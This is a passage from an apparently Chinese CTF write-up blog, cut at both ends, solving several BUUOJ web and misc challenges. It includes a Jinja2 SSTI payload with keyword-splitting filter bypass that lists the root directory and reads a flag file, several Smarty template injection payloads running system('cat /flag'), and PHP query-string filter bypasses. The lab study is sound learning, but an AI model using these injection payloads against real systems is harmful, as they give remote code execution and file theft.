class=\"token operator\">=</span> <span class=\"token string\">\"\"</span>\n        form <span class=\"token operator\">=</span> NameForm1<span class=\"token punctuation\">(</span>text<span class=\"token punctuation\">)</span> \n        <span class=\"token keyword\">return</span> render_template<span class=\"token punctuation\">(</span><span class=\"token string\">\"index.html\"</span><span class=\"token punctuation\">,</span> form <span class=\"token operator\">=</span>form<span class=\"token punctuation\">,</span> method <span class=\"token operator\">=</span> <span class=\"token string\">\"ãÆ\"</span><span class=\"token punctuation\">,</span> img <span class=\"token operator\">=</span> <span class=\"token string\">\"flask1.png\"</span><span class=\"token punctuation\">)</span>\n@ app<span class=\"token punctuation\">.</span>route<span class=\"token punctuation\">(</span><span class=\"token string\">'/&lt;name>'</span><span class=\"token punctuation\">,</span> methods <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string\">'GET'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> \n<span class=\"token keyword\">def</span> <span class=\"token function\">not_found</span><span class=\"token punctuation\">(</span>name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span> \n    <span class=\"token keyword\">return</span> render_template<span class=\"token punctuation\">(</span><span class=\"token string\">\"404.html\"</span><span class=\"token punctuation\">,</span> name <span class=\"token operator\">=</span> name<span class=\"token punctuation\">)</span> \n<span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">'__main__'</span><span class=\"token punctuation\">:</span>\n    app<span class=\"token punctuation\">.</span>run<span class=\"token punctuation\">(</span>host <span class=\"token operator\">=</span> <span class=\"token string\">\"0.0.0.0\"</span><span class=\"token punctuation\">,</span> port <span class=\"token operator\">=</span> <span class=\"token number\">5000</span><span class=\"token punctuation\">,</span> debug <span class=\"token operator\">=</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>这下整到完整的源码了，就是subclasses为什么会无输出，这里看起来没有什么问题，关注一下waf过滤了不少的关键词，但是我们可用使用拼接来绕过限制。</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">&#123;% for i in [].__class__.__base__.__subclasses__() %&#125;&#123;% if i.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;&#123; i.__init__.__globals__[&#39;__builtins__&#39;][&#39;__imp&#39;+&#39;ort__&#39;](&#39;o&#39;+&#39;s&#39;).listdir(&#39;&#x2F;&#39;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;\n编码：\neyUgZm9yIGkgaW4gW10uX19jbGFzc19fLl9fYmFzZV9fLl9fc3ViY2xhc3Nlc19fKCkgJX17JSBpZiBpLl9fbmFtZV9fPT0nY2F0Y2hfd2FybmluZ3MnICV9e3sgaS5fX2luaXRfXy5fX2dsb2JhbHNfX1snX19idWlsdGluc19fJ11bJ19faW1wJysnb3J0X18nXSgnbycrJ3MnKS5saXN0ZGlyKCcvJykgfX17JSBlbmRpZiAlfXslIGVuZGZvciAlfQ&#x3D;&#x3D;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<p><img src=\"https://gitee.com/A1andNS/blogimage/raw/master/img/20210420110818.png\" alt=\"根目录下flag文件\"></p>\n<p>下面去读一下文件：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">&#123;% for i in [].__class__.__base__.__subclasses__() %&#125;&#123;% if i.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;&#123; i.__init__.__globals__[&#39;__builtins__&#39;].open(&#39;&#x2F;this_is_the_fla&#39;+&#39;g.txt&#39;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;\n编码：\neyUgZm9yIGkgaW4gW10uX19jbGFzc19fLl9fYmFzZV9fLl9fc3ViY2xhc3Nlc19fKCkgJX17JSBpZiBpLl9fbmFtZV9fPT0nY2F0Y2hfd2FybmluZ3MnICV9e3sgaS5fX2luaXRfXy5fX2dsb2JhbHNfX1snX19idWlsdGluc19fJ10ub3BlbignL3RoaXNfaXNfdGhlX2ZsYScrJ2cudHh0JykucmVhZCgpIH19eyUgZW5kaWYgJX17JSBlbmRmb3IgJX0&#x3D;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<p><img src=\"https://gitee.com/A1andNS/blogimage/raw/master/img/20210420111625.png\" alt=\"flag\"></p>\n<h2 id=\"CISCN2019-华东南赛区-Web11\"><a href=\"#CISCN2019-华东南赛区-Web11\" class=\"headerlink\" title=\"[CISCN2019 华东南赛区]Web11\"></a>[CISCN2019 华东南赛区]Web11</h2><p>考点：smarty模板注入</p>\n<p>给了一个获取IP的API，首先发现xxf是可以改变页面显示的IP地址的，而且题目告知使用smarty模板引擎，那么考虑xxf处是否存在smarty模板注入的可能。对于smarty模板，可以使用<code>&#123;$smarty.version&#125;</code>来获取smarty版本号是什么,<code>&#123;$smarty.template&#125;</code>来获取当前模板文件名。</p>\n<p><img src=\"https://gitee.com/A1andNS/blogimage/raw/master/img/20210420115512.png\" alt=\"查询成功\"></p>\n<p>这里成功看到了版本是3.1.30，模板文件名4d67881ea3ebdc31c22ffd36520512c179efab6a，可以确定这里就是一个注入点了，去看一下smarty 3的官方手册吧，smarty也不是太熟悉。也看了一篇简单的使用教程<a href=\"https://www.cnblogs.com/hehheai/p/6509720.html%EF%BC%8C%E7%BF%BB%E8%AF%91%E7%9A%84smarty3%E6%89%8B%E5%86%8Chttps://www.kancloud.cn/prothes/smarty%EF%BC%8C%60%7Bphp%7D%60%E6%A0%87%E7%AD%BE%E8%A2%AB%E7%A6%81%E7%94%A8%E4%BA%86%EF%BC%8C\">https://www.cnblogs.com/hehheai/p/6509720.html，翻译的smarty3手册https://www.kancloud.cn/prothes/smarty，`{php}`标签被禁用了，</a></p>\n<p><img src=\"https://gitee.com/A1andNS/blogimage/raw/master/img/20210420123912.png\" alt=\"php标签被禁用\"></p>\n<p>好在smarty中if标签是可以用来执行php代码的。</p>\n<p>直接用</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token punctuation\">&#123;</span><span class=\"token keyword\">if</span> <span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'cat /flag'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">&#123;</span><span class=\"token operator\">/</span><span class=\"token keyword\">if</span><span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>来读取flag</p>\n<p><img src=\"https://gitee.com/A1andNS/blogimage/raw/master/img/20210420123553.png\" alt=\"读flag\"></p>\n<p>这里既然看了手册就再多探索几种payload：</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token comment\">//变量赋值的方式来执行代码</span>\n<span class=\"token punctuation\">&#123;</span><span class=\"token variable\">$a</span> <span class=\"token operator\">=</span> <span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'cat /flag'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">&#123;</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">&#125;</span>\n<span class=\"token comment\">//使用追加方式来执行代码</span>\n<span class=\"token punctuation\">&#123;</span>append <span class=\"token keyword\">var</span> <span class=\"token operator\">=</span> <span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'cat /flag'</span><span class=\"token punctuation\">)</span> value<span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'1'</span> index<span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'0'</span><span class=\"token punctuation\">&#125;</span>\n<span class=\"token comment\">//赋值方式来执行代码</span>\n<span class=\"token punctuation\">&#123;</span>assign <span class=\"token keyword\">var</span> <span class=\"token operator\">=</span> <span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'cat /flag'</span><span class=\"token punctuation\">)</span> value<span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'1'</span><span class=\"token punctuation\">&#125;</span>\n<span class=\"token comment\">//使用块方式来执行代码</span>\n<span class=\"token punctuation\">&#123;</span>block name <span class=\"token operator\">=</span> <span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'cat /flag'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">&#123;</span><span class=\"token operator\">/</span>block<span class=\"token punctuation\">&#125;</span>\n<span class=\"token comment\">//for方式执行代码</span>\n<span class=\"token punctuation\">&#123;</span><span class=\"token keyword\">for</span> <span class=\"token variable\">$name</span><span class=\"token operator\">=</span><span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'cat /flag'</span><span class=\"token punctuation\">)</span> to <span class=\"token number\">3</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">&#123;</span><span class=\"token variable\">$name</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">&#123;</span><span class=\"token operator\">/</span><span class=\"token keyword\">for</span><span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>看来smarty能够和模板进行接触的点还是很多的，记个小笔记。</p>\n<h2 id=\"BJDCTF-2nd-elementmaster\"><a href=\"#BJDCTF-2nd-elementmaster\" class=\"headerlink\" title=\"[BJDCTF 2nd]elementmaster\"></a>[BJDCTF 2nd]elementmaster</h2><p><strong>考点：脑洞、脚本编写</strong></p>\n<p>开局一张图，什么都没有，扫描了目录依旧一无所有，甚至把图下到了本地以为是图中有玄机，但是似乎没有，看看前段源码，这两个句子倒是有点导向作用，但是还是让我想了很久，关注到id，但是搜索一下发现style里面根本就没有这两个ID的存在，十分可疑啊。</p>\n<p><img src=\"https://gitee.com/A1andNS/blogimage/raw/master/img/20210421204356.png\" alt=\"源码\"></p>\n<p>这两个是16进制的，尝试把他转成字符。</p>\n<p>一个是<code>Po.</code>，另一个是<code>php</code>，正是脑洞啊，正好得到了Po.php，访问看看是什么。Po.php输出只有一个<code>.</code>卡题了，卡了很久，脑洞不够用了，后来看了wp，发现居然是化学元素Po，5555，化学菜鸡流泪。</p>\n<p>这下整明白了，随便找几个元素试试，发现并不是所有的元素都可用访问，那就自己写一个脚本来跑一下看看那些正常吧。</p>\n<p><img src=\"https://gitee.com/A1andNS/blogimage/raw/master/img/20210421212356.png\"></p>\n<p>发现好像可用跑出一个文件名来，稍微改改脚本</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">import</span> requests\n<span class=\"token keyword\">import</span> time\n\n\npoc <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string\">'H'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'He'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'Li'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'Be'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'B'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'C'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'N'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'O'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'F'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'Ne'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'Na'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'Mg'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'Al'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'Si'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'P'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'S'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'Cl'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'Ar'</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">'K'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'Ca'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'Sc'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'Ti'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'V'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'Cr'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'Mn'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'Fe'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'Co'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'Ni'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'Cu'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'Zn'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'Ga'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'Ge'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'As'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'Se'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'Br'</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">'Kr'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'Rb'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'Sr'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'Y'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'Zr'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'Nb'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'Mo'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'Te'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'Ru'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'Rh'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'Pd'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'Ag'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'Cd'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'In'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'Sn'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'Sb'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'Te'</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">'I'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'Xe'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'Cs'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'Ba'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'La'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'Ce'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'Pr'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'Nd'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'Pm'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'Sm'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'Eu'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'Gd'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'Tb'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'Dy'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'Ho'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'Er'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'Tm'</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">'Yb'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'Lu'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'Hf'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'Ta'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'W'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'Re'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'Os'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'Ir'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'Pt'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'Au'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'Hg'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'Tl'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'Pb'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'Bi'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'Po'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'At'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'Rn'</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">'Fr'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'Ra'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'Ac'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'Th'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'Pa'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'U'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'Np'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'Pu'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'Am'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'Cm'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'Bk'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'Cf'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'Es'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'Fm'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'Md'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'No'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'Lr'</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">'Rf'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'Db'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'Sg'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'Bh'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'Hs'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'Mt'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'Ds'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'Rg'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'Cn'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'Nh'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'Fl'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'Mc'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'Lv'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'Ts'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'Og'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'Uue'</span><span class=\"token punctuation\">]</span>\nurl <span class=\"token operator\">=</span> <span class=\"token string\">'http://063ef4ee-3c60-495d-8536-23adff29b397.node3.buuoj.cn/&#123;&#125;.php'</span>\nflag <span class=\"token operator\">=</span> <span class=\"token string\">''</span>\n<span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> poc<span class=\"token punctuation\">:</span>\n    r <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span>url<span class=\"token operator\">=</span>url<span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">if</span> r<span class=\"token punctuation\">.</span>status_code <span class=\"token operator\">==</span> <span class=\"token number\">200</span><span class=\"token punctuation\">:</span>\n        flag <span class=\"token operator\">+=</span> r<span class=\"token punctuation\">.</span>text\n        <span class=\"token keyword\">print</span> <span class=\"token punctuation\">(</span><span class=\"token string\">\"[+]Filename:&#123;0&#125;\"</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    time<span class=\"token punctuation\">.</span>sleep<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>[+]Filename:And_th3_3LemEnt5_w1LL_De5tR0y_y0u.php</p>\n<p>访问一下</p>\n<p><img src=\"https://gitee.com/A1andNS/blogimage/raw/master/img/20210421213916.png\" alt=\"flag\"></p>\n<p>这题从难度上来说应该是很简单，但是脑洞我是真的开不动啊。</p>\n<h2 id=\"BJDCTF-2nd-Schrödinger\"><a href=\"#BJDCTF-2nd-Schrödinger\" class=\"headerlink\" title=\"[BJDCTF 2nd]Schrödinger\"></a>[BJDCTF 2nd]Schrödinger</h2><p><strong>考点：</strong>脑洞、时间戳</p>\n<p>显示这是一个暴力破解的api网站。</p>\n<p>看一下前段源码，发现提示Note : Remenmber to remove test.php!</p>\n<p><img src=\"https://gitee.com/A1andNS/blogimage/raw/master/img/20210421220921.png\" alt=\"test.php\"></p>\n<p>是一个登录页面，而且似乎需要获取admin密码。以为可以sql啥的整了半天，最后才想起来回到首页来进行爆破试试。但是这个爆破速度也太慢了吧，抓包检查一下。</p>\n<p><img src=\"https://gitee.com/A1andNS/blogimage/raw/master/img/20210421222418.png\" alt=\"check\"></p>\n<p>解一下url再来个base64发现是一个时间戳1619014885</p>\n<p>那我就去转换一下，发现时当是的时间，那我伪造一个时间戳去传入看看。这个时间戳改大了没有用，直接给我NA%了，那就改小，给他设置为空值。就到了99%了</p>\n<p><img src=\"https://gitee.com/A1andNS/blogimage/raw/master/img/20210421224329.png\" alt=\"解密进度\"></p>\n<p>在时间戳为空时check一下，得到了信息。</p>\n<p><img src=\"https://gitee.com/A1andNS/blogimage/raw/master/img/20210421225333.png\" alt=\"爆破结果\"></p>\n<p>很可惜登录还是失败了，这里又是一个脑洞的地方，av11664517是不是很熟悉，如果经常逛B站应该就会认出它，然而我还是没有缓过神来。</p>\n<p>然后这flag在评论区里面。。。脑洞无处不在。</p>\n<p>BJD{Quantum_Mechanics_really_Ez}</p>\n<h2 id=\"BJDCTF-2nd-老文盲了\"><a href=\"#BJDCTF-2nd-老文盲了\" class=\"headerlink\" title=\"[BJDCTF 2nd]老文盲了\"></a>[BJDCTF 2nd]老文盲了</h2><p><strong>考点：生僻字拼音</strong></p>\n<p>文盲是什么，当然是不认识字，不认识字的最直接表象就是不会读。那么就用<a href=\"https://pinyin.supfree.net/%E5%9C%A8%E7%BA%BF%E6%B1%89%E5%AD%97%E8%BD%AC%E6%8B%BC%E9%9F%B3%E7%9A%84%E6%93%8D%E4%BD%9C%E3%80%82\">https://pinyin.supfree.net/在线汉字转拼音的操作。</a></p>\n<p>然后读出flag：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">bì jí dì dà kuò hào zhè jiù shì fǔ lài gē zhí jiē jiāo lè bā dà kuò hào \nBJD&#123;淛匶襫黼瀬鎶軄鶛驕鳓哵&#125;\n中间的不改动就好<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<h2 id=\"BJDCTF-2nd-cat-flag\"><a href=\"#BJDCTF-2nd-cat-flag\" class=\"headerlink\" title=\"[BJDCTF 2nd]cat_flag\"></a>[BJDCTF 2nd]cat_flag</h2><p><strong>考点：二进制</strong></p>\n<p>做了分帧的操作，没有什么作用，16进制和通道分离也都没有看出什么端倪，最后还是要回归到这张gif本身，很多的小方格，有的有鸡腿，有的是米饭，刚好只有两种可能，要么是鸡腿要么是米饭，那么就有可能是二进制了。</p>\n<p><img src=\"https://gitee.com/A1andNS/blogimage/raw/master/img/20210421233857.png\" alt=\"gif\"></p>\n<p>所以整一下二进制看看行不行：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">01000010\n01001010\n01000100\n01111011\n01001101\n00100001\n00110000\n01111110\n01111101\n转一下ascii<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><img src=\"https://gitee.com/A1andNS/blogimage/raw/master/img/20210421234316.png\" alt=\"转码\"></p>\n<p>得到flag</p>\n<h2 id=\"MRCTF2020-套娃\"><a href=\"#MRCTF2020-套娃\" class=\"headerlink\" title=\"[MRCTF2020]套娃\"></a>[MRCTF2020]套娃</h2><p>考点：代码审计、绕过</p>\n<p>第一层套娃的源码：</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token variable\">$query</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_SERVER</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'QUERY_STRING'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n\n <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span> <span class=\"token function\">substr_count</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$query</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'_'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">!==</span> <span class=\"token number\">0</span> <span class=\"token operator\">||</span> <span class=\"token class-name\">substr_count</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$query</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'%5f'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">!=</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'Y0u are So cutE!'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'b_u_p_t'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">!==</span> <span class=\"token string single-quoted-string\">'23333'</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/^23333$/'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'b_u_p_t'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"you are going to the next ~\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>这里会对QUERY_STRING获取的字符进行子串计数，只有没有相关子串存在才行，但是下面GET参数为b_u_p_t所以需要绕过，这里可以利用substr_count函数区分大小写来用%5F来绕过，也可以利用空格与_等效来绕过。后面和23333比较的绕过则使用23333%0a即可绕过，这样即可以满足匹配也能够满足比较不同。</p>\n<p><code>?b%5Fu%5Fp%5Ft</code></p>\n<p>第二层套娃,首先jsfuck得到传POST参数Merak，得到源码：</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> \n<span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> \n<span class=\"token keyword\">include</span> <span class=\"token string single-quoted-string\">'takeip.php'</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">ini_set</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'open_basedir'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'.'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> \n<span class=\"token keyword\">include</span> <span class=\"token string single-quoted-string\">'flag.php'</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'Merak'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span> \n    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> \n    <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> \n<span class=\"token punctuation\">&#125;</span> \n\n\n<span class=\"token keyword\">function</span> <span class=\"token function\">change</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$v</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span> \n    <span class=\"token 